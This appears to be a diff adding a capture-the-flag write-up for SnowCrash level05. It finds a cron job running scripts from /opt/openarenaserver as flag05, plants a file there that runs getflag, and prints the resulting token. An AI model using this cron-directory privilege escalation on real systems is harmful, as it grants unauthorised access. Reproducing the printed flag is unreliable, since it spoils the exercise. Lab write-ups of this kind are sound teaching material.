@@ -1,0 +1,28 @@
+You have new mail,
+
+Ok, 
+
+level05@SnowCrash:~$ cat /var/mail/level05 
+*/2 * * * * su -c "sh /usr/sbin/openarenaserver" - flag05
+
+It's a cron task, every two minute /usr/sbin/openareaserver script run with flag05 perm,
+
+level05@SnowCrash:~$ cat /var/mail/level05 
+*/2 * * * * su -c "sh /usr/sbin/openarenaserver" - flag05
+level05@SnowCrash:~$ cat /usr/sbin/openarenaserver 
+#!/bin/sh
+
+for i in /opt/openarenaserver/* ; do
+        (ulimit -t 5; bash -x "$i")
+        rm -f "$i"
+done
+
+Every two minute all file of /opt/openserver/ testing with bash -x and get delete.
+So just create a simple file, 
+
+echo "getflag > /tmp/flag" > /opt/openarenaserver/test ; chmod +x /opt/openarenaserver/test
+
+Wait 2 minutes and result is in /tmp/flag.
+
+level05@SnowCrash:~$ cat /tmp/flag
+Check flag.Here is your token : viuaaale9huek52boumoomioc
